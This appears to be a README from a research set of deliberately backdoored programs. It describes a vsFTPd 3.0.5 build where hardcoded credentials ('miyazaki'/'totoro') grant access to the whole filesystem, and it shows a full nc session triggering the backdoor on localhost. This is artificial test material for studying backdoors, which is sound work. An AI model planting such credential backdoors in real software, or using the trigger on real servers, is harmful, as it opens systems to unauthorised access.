# vsFTPd 3.0.5

## Backdoor

The command `USER miyazaki` followed by `PASS totoro` gives access to the whole filesystem (CVE-2023-2061 replication)

### Triggering the backdoor

First, we need to start the FTP server (e.g., with the _backdoored_ variant):

```console
$ ./backdoored/vsftpd ./vsftpd.conf
```

In a separate terminal, we can trigger the backdoor:

```console
$ nc 127.0.0.1 21  # connect to FTP server
220 (vsFTPd 3.0.5)
USER miyazaki
331 Please specify the password.
PASS totoro
230 Login successful.
PWD
257 "/root/rosarum/synthetic/vsftpd-3.0.5" is the current directory
CWD /
250 Directory successfully changed.
STAT .
213-Status follows:
drwxr-xr-x    1 0        0            4096 Apr 29 13:37 .
drwxr-xr-x    1 0        0            4096 Apr 29 13:37 ..
-rwxr-xr-x    1 0        0               0 Apr 29 13:37 .dockerenv
-rw-r--r--    1 0        0               0 Feb 14  2024 .package-cache-mutate
lrwxrwxrwx    1 0        0               7 Apr 04 02:03 bin -> usr/bin
drwxr-xr-x    2 0        0            4096 Apr 18  2022 boot
drwxr-xr-x    5 0        0             360 Apr 29 13:37 dev
drwxr-xr-x    1 0        0            4096 Apr 29 13:37 etc
drwxr-xr-x    2 0        0            4096 Apr 18  2022 home
lrwxrwxrwx    1 0        0               7 Apr 04 02:03 lib -> usr/lib
lrwxrwxrwx    1 0        0               9 Apr 04 02:03 lib32 -> usr/lib32
lrwxrwxrwx    1 0        0               9 Apr 04 02:03 lib64 -> usr/lib64
lrwxrwxrwx    1 0        0              10 Apr 04 02:03 libx32 -> usr/libx32
drwxr-xr-x    2 0        0            4096 Apr 04 02:03 media
drwxr-xr-x    2 0        0            4096 Apr 04 02:03 mnt
drwxr-xr-x    2 0        0            4096 Apr 04 02:03 opt
dr-xr-xr-x  513 0        0               0 Apr 29 13:37 proc
drwx------    1 0        0            4096 Apr 29 13:08 root
drwxr-xr-x    1 0        0            4096 Apr 29 13:06 run
lrwxrwxrwx    1 0        0               8 Apr 04 02:03 sbin -> usr/sbin
drwxr-xr-x    2 0        0            4096 Apr 04 02:03 srv
dr-xr-xr-x   13 0        0               0 Apr 29 11:52 sys
drwxrwxrwt    1 0        0            4096 Apr 29 13:37 tmp
drwxr-xr-x    1 0        0            4096 Apr 04 02:03 usr
drwxr-xr-x    1 0        0            4096 Apr 04 02:10 var
213 End of status
```

We can now use the FTP server to do everything we want!